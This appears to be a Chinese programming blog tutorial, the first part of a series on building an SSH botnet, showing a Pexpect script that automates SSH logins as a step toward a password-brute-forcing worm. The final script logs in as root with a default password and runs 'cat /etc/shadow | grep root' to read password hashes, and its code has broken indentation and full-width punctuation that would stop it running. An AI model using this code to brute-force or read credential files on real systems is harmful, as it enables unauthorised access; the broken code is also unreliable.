# 原创
：  【Python脚本进阶】2.2、构建一个SSH僵尸网络（上）：SSH交互脚本

# 【Python脚本进阶】2.2、构建一个SSH僵尸网络（上）：SSH交互脚本

**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[概述：](#%E6%A6%82%E8%BF%B0%EF%BC%9A)

[漏洞利用方式](#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F)

[二、用Pexpect与SSH交互](#%E4%BA%8C%E3%80%81%E7%94%A8Pexpect%E4%B8%8ESSH%E4%BA%A4%E4%BA%92)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[环境：](#%E7%8E%AF%E5%A2%83%EF%BC%9A)

[函数：](#%E5%87%BD%E6%95%B0%EF%BC%9A)

[三、实现](#%E4%B8%89%E3%80%81%E5%AE%9E%E7%8E%B0)

[第一步：](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A)

[第二步：](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A)

[整合：](#%E6%95%B4%E5%90%88%EF%BC%9A)

---


## 一、简介

> 
<h3>概述：</h3>
第一步：创建一个用来搜寻目标的端口扫描程序
现在来到第二步了
第二步：开始利用这些服务中的漏洞


> 
<h3>漏洞利用方式</h3>
Morris蠕虫有三种攻击方式， 其中之一就是用常见的用户名和密码尝试登录RSH服务(remote shell)。RSH是1988年问世， 它为系统管理员提供远程连接一台机器， 并能在主机上运行一系列终端命令对它进行管理的方法
<hr/>
后来在RSH中增加一个公钥加密算法， 以保护其经过网络传递的数据， 这就是SSHC Secure Shell) 协议， 最终SSH 取代了RSH。不过， 对千防范用常见用户名和密码尝试暴力登录的攻击方法， 这并不能起到多大的作用。SSH 蠕虫已经被证明是非常成功的和常见的攻击方式
<hr/>
远程IP 地址正试图暴力生成可能的密码后， IDS 阻断该IP 继续尝试登录SSH 的企图


---


---


---


## 二、用Pexpect与SSH交互

> 
<h3>简介：</h3>
实现我们自己的能暴力破解特定目标用户名／密码的SSH 蠕虫。因为SSH客户端需要用户与之进行交互， 我们的脚本必须在发送进一步的输入命令之前等待并“ 理解＂ 屏幕输出的意义
<hr/>
考虑以下情形：连接架在IP 地址127.0.0.1上SSH 的机器，应用程序首先会要求我们确认RSA 密钥指纹。必须回答“ 是＂ ， 然后才能继续。在给我们一个命令提示符之前， 应用程序要求我们输入密码。最后，还要执行uname-v 命令来确定目标机器上系统内核的版本
<hr/>

 如果是拒绝连接的话，可能是ssh没启动
输入
sudo /etc/init.d/ssh start



---


> 
<h3>环境：</h3>
为了能自动完成上述控制台交互过程， 需要使用一个第三方Python 模块一Pexpect[Pexpect version 4.8 — Pexpect 4.8 documentation<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://pexpect.readthedocs.io/en/latest/](https://pexpect.readthedocs.io/en/latest/)Pexpect 能够实现与程序交互、等待预期的屏幕输出， 并据此做出不同的响应。这使得它成为自动暴力破解SSH 用户口令程序的首选工具。



> 
<h3>函数：</h3>
prompt 是提示的意思. 在 Python 语言中，是一个用户自定义的字符串变量名，目的和作用就是把变量 prompt 的内容作为提示信息
pexpect. spawn收集交互期间生成的返回值


---


---


## 三、实现

> 
<h3>第一步：</h3>
检测connect(）函数。该函数接收的参数包括一个用户名、主机名和密码， 返回的是以此进行的SSH 连接的结果。
<hr/>
利用pexpect 库， 程序等待一个“可以预计到的“ 输出。可能会出现三种可能的输出： 超时、表示主机已使用一个新的公钥的消息和要求输入密码的提示。如果出现超时， 那么session.expect()返回0。用if 语句会识别出这一情况，打印一个错误消息后返回。如果child.expect()方法捕获了ssh_newkey 消息， 它会返回一个1， 这会使函数发送一个“ yes" 消息， 以接收新的密钥。之后， 函数等待密码提示，然后发送SSH 密码
<pre><code>import pexpect
PROMPT = ['#', '&gt;&gt;&gt;', '&gt;', '\$']
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr）
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword：'])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT, '[P|p] assword:'])
        if ret == 0:
            print('[-] Error Connecting')
            return
        child.sendline( password )
        child.expect( PROMPT )
        return child</code></pre>


> 
<h3>第二步：</h3>
通过验证，就可以使用一个单独的command()函数在SSH 会话中发送命令。command(）函数需要接收的参数是一个SSH 会话和命令字符串。然后，它向会话发送命令字符串， 并等待命令提示符再次出现。在获得命令提示符后，该函数把从SSH 会话那里得到的结果打印出来

<pre><code>import pexpect
PROMPT = ['#', '&gt;&gt;&gt;', '&gt;', '\$']
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)</code></pre>


> 
<h3>整合：</h3>
完整的模拟人交互行为的连接和控制SSH 会话的脚本
<pre><code>import pexpect
PROMPT = ['#', '&gt;&gt;&gt;', '&gt;', '\$']
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr）
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword：'])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT, '[P|p] assword:'])
        if ret == 0:
            print('[-] Error Connecting')
            return
        child.sendline( password )
        child.expect( PROMPT )
        return child


def main():
    host ='localhost'
    user ='root'
    password ='toor'
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')


if __name__ == '__main__':
    main()</code></pre>

